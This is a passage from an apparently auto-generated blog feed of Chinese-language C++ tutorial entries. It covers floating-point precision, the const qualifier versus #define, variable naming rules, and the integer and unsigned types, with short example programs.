class="number">3.0f</span>;</span><br><span class="line">    <span class="keyword">float</span> y = <span class="number">3.0f</span> * x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = 3.0f * (1.0f / 3.0f) = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 可能不是精确的 1.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong> 在使用浮点数时，要意识到它们是近似值，并避免直接进行相等性比较。在需要精确计算（如金融计算）的场合，可能需要使用专门的库或定点数表示法。对于大多数科学和工程计算，<code>double</code> 提供了足够的精度和范围。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.2 const限定符</title>
      <link href="2025/04/26/3.2_const%E9%99%90%E5%AE%9A%E7%AC%A6/"/>
      <url>2025/04/26/3.2_const%E9%99%90%E5%AE%9A%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>现在我们来探讨一种在C++中创建<strong>常量 (Constant)</strong> 的更可靠的方法：使用 <code>const</code> 限定符。常量是指在程序运行期间其值不能被修改的量。</p><p><code>const</code> 是一个**类型限定符 (Type Qualifier)**，它用于修改变量的声明，使其成为只读。</p><p><strong>作用:</strong></p><ul><li>  <strong>创建符号常量:</strong> <code>const</code> 允许你为常量值（如圆周率、最大尝试次数等）赋予一个有意义的名称，提高代码的可读性和可维护性。</li><li>  <strong>防止意外修改:</strong> 一旦变量被声明为 <code>const</code> 并初始化后，编译器会阻止任何试图修改该变量值的代码。这有助于防止因意外赋值而导致的错误。</li><li>  <strong>类型安全:</strong> 与使用 <code>#define</code> 创建宏常量相比，<code>const</code> 常量具有明确的数据类型，编译器可以对其进行类型检查，更加安全。</li><li>  <strong>作用域:</strong> <code>const</code> 常量遵循标准的作用域规则（例如，在函数内部定义的 <code>const</code> 常量只在该函数内有效），而 <code>#define</code> 宏是全局替换。</li></ul><p><strong>声明和初始化:</strong></p><p>声明 <code>const</code> 变量的语法是在类型名前或类型名后加上 <code>const</code> 关键字。<strong>关键在于，<code>const</code> 变量必须在声明时进行初始化</strong>，因为之后就不能再给它赋值了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> type variableName = value; </span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">type <span class="keyword">const</span> variableName = value; <span class="comment">// 两种写法等效，第一种更常见</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明并初始化 const 变量</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> MONTHS_IN_YEAR = <span class="number">12</span>; <span class="comment">// 常量，表示一年中的月份数</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> PI = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* GREETING = <span class="string">&quot;Hello, world!&quot;</span>; <span class="comment">// 指向常量字符串的常量指针 (更复杂，后续章节详解)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 尝试修改 const 变量会导致编译错误</span></span><br><span class="line">    <span class="comment">// MONTHS_IN_YEAR = 13; // 错误! 不能给 const 变量赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Months in a year: &quot;</span> &lt;&lt; MONTHS_IN_YEAR &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">double</span> radius = <span class="number">5.0</span>;</span><br><span class="line">    <span class="keyword">double</span> circumference = <span class="number">2</span> * PI * radius; <span class="comment">// 使用 const 常量 PI</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Circumference: &quot;</span> &lt;&lt; circumference &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// const 常量也遵循作用域规则</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> MAX_TRIES = <span class="number">3</span>; <span class="comment">// 只在 if 块内有效</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max tries inside block: &quot;</span> &lt;&lt; MAX_TRIES &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; MAX_TRIES; // 错误! MAX_TRIES 在此作用域外不可见</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须在声明时初始化</span></span><br><span class="line">    <span class="comment">// const int DAYS_IN_WEEK; // 错误! const 变量需要初始化</span></span><br><span class="line">    <span class="comment">// DAYS_IN_WEEK = 7; </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>const</code> 与 <code>#define</code> 的比较:</strong></p><p>在 C 语言中，通常使用 <code>#define</code> 预处理器指令来创建符号常量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MONTHS_IN_YEAR 12 <span class="comment">// C 风格宏定义</span></span></span><br></pre></td></tr></table></figure><p>虽然 <code>#define</code> 也能达到类似目的，但 <code>const</code> 在 C++ 中通常是更好的选择：</p><ol><li> <strong>类型安全:</strong> <code>const</code> 常量有明确的数据类型，编译器会进行类型检查。<code>#define</code> 只是简单的文本替换，没有类型信息，可能导致意外错误。</li><li> <strong>作用域:</strong> <code>const</code> 常量遵循 C++ 的作用域规则，可以创建局部常量。<code>#define</code> 宏通常是全局的（从定义点到文件尾），容易造成命名冲突。</li><li> <strong>调试:</strong> <code>const</code> 常量在调试器中通常可见，有符号名。<code>#define</code> 宏在编译前就被替换掉了，调试时可能只能看到替换后的字面值。</li><li> <strong>类作用域:</strong> <code>const</code> 可以用于定义类作用域内的常量（类成员），而 <code>#define</code> 不能直接做到这一点。</li></ol><p><strong>一般建议:</strong> 在 C++ 中，优先使用 <code>const</code> 来定义符号常量，而不是 <code>#define</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.1 简单变量</title>
      <link href="2025/04/26/3.1_%E7%AE%80%E5%8D%95%E5%8F%98%E9%87%8F/"/>
      <url>2025/04/26/3.1_%E7%AE%80%E5%8D%95%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<p>在第2章中，我们已经接触了变量的声明和使用。本章将深入探讨C++的基本数据类型，首先从用于存储数字和字符的简单变量开始。简单变量是C++中存储数据的基本单元。</p><h2 id="3-1-1-变量名"><a href="#3-1-1-变量名" class="headerlink" title="3.1.1 变量名"></a>3.1.1 变量名</h2><p>变量名是赋予内存位置的标识符，用于访问存储在该位置的数据。在C++中，选择有意义的变量名是良好编程实践的一部分。</p><p><strong>命名规则:</strong></p><ol><li> <strong>字符集:</strong> 变量名只能包含字母（大小写）、数字和下划线 <code>_</code>。</li><li> <strong>首字符:</strong> 名称的第一个字符不能是数字。</li><li> <strong>区分大小写:</strong> C++是大小写敏感的，<code>myVariable</code> 和 <code>myvariable</code> 是两个不同的变量名。</li><li> <strong>不能是关键字:</strong> 不能使用C++关键字（如 <code>int</code>, <code>double</code>, <code>return</code>, <code>if</code>, <code>class</code> 等）作为变量名。</li><li> <strong>长度限制:</strong> C++对名称的长度没有硬性规定，但长名称可能会在某些旧编译器或链接器上遇到问题。通常，有意义且不过于冗长的名称是最好的。</li><li><strong>下划线的使用:</strong><ul><li>  以两个下划线 <code>__</code> 开头或以下划线和大写字母 <code>_A</code> 到 <code>_Z</code> 开头的名称被保留给编译器及其使用的资源使用。</li><li>  以下划线 <code>_</code> 开头的名称被保留用作全局标识符。</li><li>  虽然在某些情况下可以使用以下划线开头的名称（例如在函数内部），但最好避免这种用法，以防与系统使用的名称冲突。</li></ul></li></ol><p><strong>命名约定 (非强制，但推荐):</strong></p><ul><li>  <strong>有意义:</strong> 变量名应反映其存储的数据或用途（例如 <code>numberOfStudents</code>, <code>userName</code>, <code>totalScore</code>）。</li><li>  <strong>驼峰命名法 (Camel Case):</strong> 从第二个单词开始，每个单词的首字母大写（例如 <code>myVariableName</code>, <code>studentAge</code>）。这是C++中常见的风格。</li><li>  <strong>下划线分隔 (Snake Case):</strong> 使用下划线分隔单词（例如 <code>my_variable_name</code>, <code>student_age</code>）。这也是一种常见的风格。</li><li>  选择一种风格并保持一致。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 合法的变量名</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> accountBalance;</span><br><span class="line">    <span class="keyword">char</span> first_initial;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> populationOfEarth;</span><br><span class="line">    <span class="keyword">int</span> _internal_counter; <span class="comment">// 合法，但不推荐在全局使用</span></span><br><span class="line">    <span class="keyword">int</span> value2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非法的变量名</span></span><br><span class="line">    <span class="comment">// int 1stPlace;      // 不能以数字开头</span></span><br><span class="line">    <span class="comment">// double account Balance; // 不能包含空格</span></span><br><span class="line">    <span class="comment">// int return;        // 不能是关键字</span></span><br><span class="line">    <span class="comment">// char my-char;      // 不能包含连字符 &#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 区分大小写</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> Count = <span class="number">20</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; Count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-1-2-整型"><a href="#3-1-2-整型" class="headerlink" title="3.1.2 整型"></a>3.1.2 整型</h2><p><strong>整型 (Integer)</strong> 是没有小数部分的数字。C++提供了多种整型类型来存储整数，它们的主要区别在于占用的内存空间大小以及能够表示的数值范围。</p><p>计算机内存由称为<strong>位 (bit)</strong> 的单元组成。8个位组成一个**字节 (byte)**。每个位可以表示两种状态（通常是0或1）。字节是内存中最小的可寻址单元，意味着每个字节都有一个唯一的地址。</p><p>不同的整型类型使用不同数量的字节来存储值。使用的字节数越多，可以表示的整数范围就越大。</p><p><strong>基本整型类型:</strong></p><ul><li>  <code>short</code></li><li>  <code>int</code></li><li>  <code>long</code></li><li>  <code>long long</code> (C++11 新增)</li></ul><p>我们将在下一节详细讨论这些类型。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明不同类型的整型变量</span></span><br><span class="line">    <span class="keyword">short</span> smallNumber;</span><br><span class="line">    <span class="keyword">int</span> standardInteger;</span><br><span class="line">    <span class="keyword">long</span> largeInteger;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> veryLargeInteger; <span class="comment">// 需要 C++11 或更高版本</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    smallNumber = <span class="number">10</span>;</span><br><span class="line">    standardInteger = <span class="number">10000</span>;</span><br><span class="line">    largeInteger = <span class="number">1000000</span>;</span><br><span class="line">    veryLargeInteger = <span class="number">10000000000L</span>L; <span class="comment">// LL 后缀表示 long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short: &quot;</span> &lt;&lt; smallNumber &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int: &quot;</span> &lt;&lt; standardInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long: &quot;</span> &lt;&lt; largeInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long long: &quot;</span> &lt;&lt; veryLargeInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-1-3-整型short、int、long和long-long"><a href="#3-1-3-整型short、int、long和long-long" class="headerlink" title="3.1.3 整型short、int、long和long long"></a>3.1.3 整型short、int、long和long long</h2><p>C++标准规定了各种整型类型的最小尺寸（占用的内存位数），但具体尺寸可能因编译器和操作系统而异。</p><p><strong>标准规定的最小尺寸:</strong></p><ul><li>  <code>short</code>: 至少16位。</li><li>  <code>int</code>: 至少和 <code>short</code> 一样大，通常是系统处理效率最高的整数长度（例如，在32位系统上通常是32位，64位系统上可能是32位或64位）。</li><li>  <code>long</code>: 至少32位，且至少和 <code>int</code> 一样大。</li><li>  <code>long long</code>: 至少64位，且至少和 <code>long</code> 一样大。</li></ul><p><strong>如何查看具体尺寸:</strong></p><p>可以使用 <code>sizeof</code> 运算符来查看特定类型在你的系统上占用的字节数。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;climits&gt; // 包含整型限制信息 (如 INT_MAX)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 sizeof 查看各种类型占用的字节数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of short: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">short</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of int: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long long: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看 int 类型的最大值 (需要 &lt;climits&gt;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Maximum value for int: &quot;</span> &lt;&lt; INT_MAX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 类似地，有 SHRT_MAX, LONG_MAX, LLONG_MAX 等</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明和初始化</span></span><br><span class="line">    <span class="keyword">short</span> s_value = <span class="number">32767</span>; <span class="comment">// 通常是 short 的最大值 (如果 short 是 16 位)</span></span><br><span class="line">    <span class="keyword">int</span> i_value = <span class="number">2000000000</span>; </span><br><span class="line">    <span class="keyword">long</span> l_value = <span class="number">1000000000L</span>; <span class="comment">// L 后缀表示 long (可选，但有时有助于清晰)</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ll_value = <span class="number">50000000000L</span>L; <span class="comment">// LL 后缀表示 long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short value: &quot;</span> &lt;&lt; s_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int value: &quot;</span> &lt;&lt; i_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long value: &quot;</span> &lt;&lt; l_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long long value: &quot;</span> &lt;&lt; ll_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 溢出示例 (行为是未定义的或回绕)</span></span><br><span class="line">    <span class="keyword">short</span> max_short = SHRT_MAX;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max short: &quot;</span> &lt;&lt; max_short &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    max_short = max_short + <span class="number">1</span>; <span class="comment">// 尝试超出最大值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max short + 1: &quot;</span> &lt;&lt; max_short &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 可能变成负数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 当一个整数值超出了其类型所能表示的最大范围时，会发生<strong>溢出 (Overflow)**。对于有符号整数溢出，C++标准规定其行为是</strong>未定义的 (Undefined Behavior)**，这意味着任何事情都可能发生（程序崩溃、得到奇怪的结果等）。对于无符号整数溢出，行为是定义好的（通常是回绕，即从0重新开始）。</p><h2 id="3-1-4-无符号类型"><a href="#3-1-4-无符号类型" class="headerlink" title="3.1.4 无符号类型"></a>3.1.4 无符号类型</h2><p>对于每种整型（<code>short</code>, <code>int</code>, <code>long</code>, <code>long long</code>），都存在一个对应的<strong>无符号 (unsigned)</strong> 版本。无符号类型只能存储非负整数（0和正数）。</p><p>通过在类型名前加上 <code>unsigned</code> 关键字来声明无符号类型。</p><p><strong>特点:</strong></p><ul><li>  <strong>范围:</strong> 在相同的字节数下，无符号类型可以表示的最大值大约是有符号类型的两倍，因为它们不需要用一位来表示正负号。范围从 0 开始。</li><li>  <strong>用途:</strong> 当你知道一个变量永远不会是负数时（例如，计数器、数组索引、人口数量等），使用无符号类型可以增大其可表示的正数范围。</li><li>  <strong>回绕 (Wrap Around):</strong> 当无符号整数的值超出其最大范围时，它会从0重新开始（模运算）。例如，如果一个 <code>unsigned short</code> 的最大值是 65535，那么 <code>65535 + 1</code> 会变成 <code>0</code>。同样，<code>0 - 1</code> 会变成 <code>65535</code>。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;climits&gt; // 包含 UINT_MAX 等</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明无符号类型</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> us_value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> ui_value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ul_value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看大小和范围</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of unsigned int: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Maximum value for unsigned int: &quot;</span> &lt;&lt; UINT_MAX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    us_value = <span class="number">65535</span>; <span class="comment">// 通常是 unsigned short 的最大值 (如果 short 是 16 位)</span></span><br><span class="line">    ui_value = <span class="number">4000000000U</span>; <span class="comment">// U 后缀表示 unsigned int</span></span><br><span class="line">    ul_value = <span class="number">8000000000U</span>L; <span class="comment">// UL 后缀</span></span><br><span class="line">    ull_value = <span class="number">18000000000000000000U</span>LL; <span class="comment">// ULL 后缀</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned short: &quot;</span> &lt;&lt; us_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned int: &quot;</span> &lt;&lt; ui_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned long: &quot;</span> &lt;&lt; ul_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned long long: &quot;</span> &lt;&lt; ull_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 回绕示例</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> test_wrap = USHRT_MAX;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max unsigned short: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    test_wrap = test_wrap + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max unsigned short + 1: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 变为 0</span></span><br><span class="line"></span><br><span class="line">    test_wrap = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned short = 0&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    test_wrap = test_wrap - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned short - 1: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 变为 USHRT_MAX</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 